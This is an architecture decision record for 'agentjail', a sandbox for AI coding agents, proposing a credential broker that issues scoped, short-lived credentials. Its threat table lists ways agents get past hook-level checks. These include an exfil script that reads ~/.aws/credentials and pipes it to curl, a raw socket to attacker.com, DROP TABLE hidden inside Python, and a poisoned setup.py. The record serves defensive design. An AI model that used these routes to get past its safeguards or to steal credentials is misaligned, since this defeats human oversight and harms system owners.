# ADR 0004 — Credential broker as the structural answer to script-indirected operations

- **Status:** Proposed
- **Date:** 2026-05-23
- **Task:** future tasks sketch the work; phases TBD
- **Deciders:** agentjail-core
- **Related:** ADR 0001 (sandbox layer), ADR 0003 (MCP proxy)

## Context — the indirection problem

agentjail enforces at three layers today:

1. **Hook** — pattern-matches Bash command strings, MCP tool names, file tool inputs
2. **Shield (file)** — kernel-enforced file system deny for sensitive paths (sandbox-exec / Landlock)
3. **Shield (network)** — per-host HTTPS proxy + sbpl outbound deny

These are **necessary but not sufficient** because agents routinely abstract dangerous operations behind a layer of code execution. The hook sees the wrapper, not the operation.

### Concrete examples that defeat shell-level pattern matching

| Agent does this | Current Tier 1.5 catches? | Why not |
|---|---|---|
| Writes `drop_table.py` containing `DROP TABLE users;`, runs `python drop_table.py` | ❌ | hook sees `python drop_table.py` — no `DROP TABLE` in the Bash command string. file_policy doesn't catch the Write (it's just a .py file). shield doesn't intercept SQL. |
| Writes `exfil.sh` containing `cat ~/.aws/credentials \| curl ...`, runs `bash exfil.sh` | ⚠ partially | hook sees `bash exfil.sh`. file_policy doesn't catch the script write (.sh isn't sensitive). The shield WOULD catch the read of ~/.aws/credentials at the kernel — IF the agent uses the shielded launch path. |
| Runs `pip install -e .` against a poisoned package that has arbitrary code in `setup.py` | ❌ | pip's setup.py runs as the agent's user. The hook sees `pip install -e .` — looks benign. |
| Runs `make deploy` which orchestrates `terraform apply -auto-approve` deep in a Makefile | ❌ | hook sees `make deploy`. The destructive call is hidden behind a target name. |
| Writes a Node.js script that opens a raw TCP socket to `attacker.com:9999` | ⚠ partially | hook sees `node script.js`. The port-deny in sbpl catches port 9999. The network proxy catches HTTPS hostnames. Raw TCP on 443 to a non-allowlisted host would bypass the network proxy because it doesn't go through HTTPS_PROXY. |
| Calls an MCP tool (e.g. `mcp__database__query`) that internally executes a DROP | ❌ | MCP per-tool gating sees the tool NAME but not its argument semantics. Argument inspection (Level 2) helps but still requires us to enumerate dangerous SQL patterns. |
| Calls `aws-cli` with `--profile prod-admin` against a credential it found in `~/.aws/credentials` | ⚠ partially | shield denies *reading* `~/.aws/credentials`. If creds are already in env (e.g. `AWS_SECRET_ACCESS_KEY`), no read happens, and `aws cli` succeeds. |
| Writes a Python script that does `import boto3; boto3.client('s3').delete_bucket(...)` | ❌ | uses ambient AWS creds from env, no shell pattern visible. |

**The pattern:** as long as the agent has the *ability* (credentials, env vars, network access, write access to scripts), any operation can be expressed in a way that defeats shell-level matching. We're playing whack-a-mole at the wrong layer.

## Decision

Add a **credential broker** as the fourth Tier 1.5/1.7 layer. The idea:

> Strip the agent of every ambient credential at launch. When the agent needs
> privileged access (DB, cloud API, git push, etc.), it asks the broker. The
> broker decides via policy, issues a **scoped, short-lived credential**, and
> audits the issuance. The agent's destructive Python script then fails not
> because we detected the SQL, but because the credential it tries to use has
> only SELECT permission on a specific table.

This work brings the credential broker into the Tier 1 OSS path as `cmd/agentjail-credbroker/`.

### Architecture

```
┌──────────────┐  launch  ┌─────────────────┐
│ agentjail-  │ ───────→ │  agent process  │
│ shield       │          │                 │
│              │  env =   │  $DATABASE_URL  → unset
│ + cred-broker│  (empty) │  $AWS_*         → unset
│   sidecar    │          │  $GITHUB_TOKEN  → unset
│              │          │                 │
│              │          │  ┌────────────────────┐
│              │          │  │ agent's script:    │
│              │          │  │  needs DB access   │
│              │          │  └────────┬───────────┘
│              │          │           │
│              │  ◄───────│  ─────────┘  cred-cli get db --table=users --op=select
│              │          │                                        │
│  evaluate    │          │                                        │
│  policy      │          │                                        │
│  ┌─────────┐ │          │                                        ▼
│  │OPA Rego │ │ ───→ asks user or auto-approves                  │
│  └─────────┘ │          │                                        │
│              │  issues  │  ──→ scoped postgres role,             │
│              │ ───────→ │      TTL=15min, audit logged            │
│              │          │                                        │
│              │          │  python script.py runs:                 │
│              │          │   conn = psycopg2.connect(BROKER_DSN)   │
│              │          │   conn.execute("DROP TABLE users")      │
│              │          │   → ERROR: permission denied for table users
└──────────────┘          └─────────────────┘
```

### Components

| Component | Lives in | Responsibility |
|---|---|---|
| `agentjail-shield` (existing) | `cmd/agentjail-shield/` | strips env vars matching a blocklist (`AWS_*`, `DATABASE_URL`, `GITHUB_TOKEN`, `OPENAI_API_KEY`, …) before exec |
| `agentjail-credbroker` (new) | `cmd/agentjail-credbroker/` | Unix-socket daemon; receives `get`/`revoke`/`list` RPCs; talks to backends |
| `agentjail-cred` (new CLI) | `cmd/agentjail-cred/` | what the agent's script invokes — tiny client speaking to the broker |
| OPA Rego (existing) | `agentpolicy/policies/` | evaluates cred requests against `cred_policy.rego` (new); auto-approve / ask / deny |
| Backends | `cmd/agentjail-credbroker/backends/` | postgres (CREATE ROLE), aws (STS AssumeRole), vault (handoff to enterprise) |

### What it solves (relative to ADR 0001 layering)

| Attack surface | Pre-broker | With broker |
|---|---|---|
| DB destructive ops via Python script | ❌ undetectable in pattern-match | ✅ broker issues read-only role; DROP fails at the DB |
| Cloud API destructive ops | ❌ ambient creds | ✅ broker issues STS session with least-privilege policy |
| Git force-push via library, not git CLI | ⚠ partial | ✅ no $GITHUB_TOKEN in env; broker issues short-lived PAT with no force-push scope |
| LLM API exfil to OpenAI | ❌ env var | ✅ no $OPENAI_API_KEY; broker decides per request |
| Pure-compute destructive ops (`rm -rf` in Python) | ✅ shield catches at syscall | ✅ unchanged — broker is orthogonal |

### Components that DO NOT belong here

- **Shell-redirect bypass** (e.g. `printf x > ~/.ssh/id_rsa`) → handled by shield's file deny + command_policy's no-bash-touch-sensitive-path. Broker doesn't intersect.
- **Network exfil to a hostname** → handled by the network proxy + shield. Broker doesn't intersect.
- **Reading a non-credential file** → file_policy. Broker doesn't intersect.

The broker is the **right answer for credential-gated operations**, and only those. Combined with shield (file/network) it gives complete coverage of the indirection surface.

## Open questions

1. **Broker-agent authentication.** Agent has no ambient creds, including credentials to call the broker. Proposed: shield issues a session token at launch time (env var like `AGENTJAIL_SESSION=<uuid>`); broker pins each request to that session.

2. **Where does the broker run?** Three options:
   - **(a)** In-process with `agentjail-daemon` (shares OPA engine, simplest)
   - **(b)** Separate binary `agentjail-credbroker` (cleaner concerns; needs its own daemon-style lifecycle)
   - **(c)** Spawned per-session by `agentjail-shield` (isolated, dies with the session)
   Leaning toward **(a)** for Tier 1 simplicity; (c) for paranoid-tier later.

3. **Where do credentials come from?** Each backend has a different story. Postgres: broker has a `CREATE ROLE` admin connection (sensitive — needs separate stewardship). AWS: broker has IAM `AssumeRole` permission. Vault: broker is a Vault client. Per-backend documentation is covered in later implementation phases.

4. **DSN delivery to the agent's script.** Options:
   - Env var (`BROKER_DB_DSN`) — visible in process list, could leak via `env` command
   - Temp file with 0600 perms — needs cleanup
   - Unix socket the agent talks to (broker proxies the actual connection)
   The third is cleanest but adds latency. Probably env var for MVP, temp file for paranoid.

5. **Auto-approve policy granularity.** Should `cred_policy.rego` decide based on principal (agent ID), resource (which DB/cluster), action (select/update), and request context (interactive vs. CI)? Yes — same Cerbos-shape input we use elsewhere. Free reuse of the existing OPA engine.

6. **Revocation at session end.** Postgres roles created during a session must be `DROP ROLE`-ed when the agent exits, or they accumulate. Need a session-lifecycle hook from shield → broker.

## Phased implementation (sketch)

| Phase | What | Estimate |
|---|---|---|
| ADR | This ADR | done with this commit |
| Strip ambient creds | Strip ambient credentials in `agentjail-shield` (env-var blocklist; configurable via `policy.yaml`) | 3h |
| Daemon | `agentjail-credbroker` daemon: Unix socket protocol, OPA policy eval, in-process with `agentjail-daemon` | 1.5 days |
| Client CLI | `agentjail-cred` CLI (the agent's client shim): `get`, `revoke`, `list` subcommands | 4h |
| Policy schema | `cred_policy.rego` schema; default rules for postgres/aws/git; integration tests | 1 day |
| Postgres backend | Postgres backend: `CREATE ROLE` with scoped grants + TTL via pg_cron or session-end DROP | 2 days |
| AWS backend | AWS STS backend: `AssumeRole` with scoped session policy | 1 day |
| Audit pipeline | Audit pipeline: every issuance + every use appears in `agentjail logs` with `cred_id` correlation | 1 day |

Total ~8 days of agent work for a usable v0. Vault and GitHub-PAT backends slot in afterwards.

## Consequences

**Positive:**

- Closes the entire class of script-indirected credential attacks (DROP TABLE via Python, AWS delete via boto3, force-push via library)
- Audit per-credential is more useful than audit per-tool-call (forensics: "what did the agent's session actually do with the DB?")
- Self-contained Tier 1.5 OSS cred story — no external service dependency

**Negative:**

- Adds three new binaries (broker daemon, broker CLI, backend plugins)
- Requires per-backend admin stewardship (the broker needs `CREATE ROLE` privileges on every Postgres database it serves — that's a serious operational responsibility)
- Adds latency to credentialed operations (~10 ms per `agentjail-cred get`)
- Agent scripts must be rewritten to call the broker — not all existing scripts will work unchanged (mitigated by a thin compat shim that auto-issues for legacy env-var lookups)

## Rejected alternatives

| Alternative | Why rejected |
|---|---|
| Content-scan every .py / .sh for dangerous patterns | Same whack-a-mole as shell-level matching, with the additional false-positive surface of scanning all code the agent writes |
| Force agents to use specific "safe wrappers" (e.g. `db-readonly` instead of `psql`) | Brittle — agents will route around it (via libraries, alternate clients). Works only when combined with cred isolation, in which case the cred-isolation IS the enforcement; wrappers are syntactic sugar |
| Run agent in Tier 2 microVM with a snapshotted DB | Bulletproof but heavy; right answer for high-paranoia teams. Broker is the right Tier 1.5 answer that works for the 90% case without a VM |
| Detect indirection at the eBPF/syscall layer | Tier 3 only — needs CAP_SYS_ADMIN + months of work; correct strategic direction but wrong sequencing |
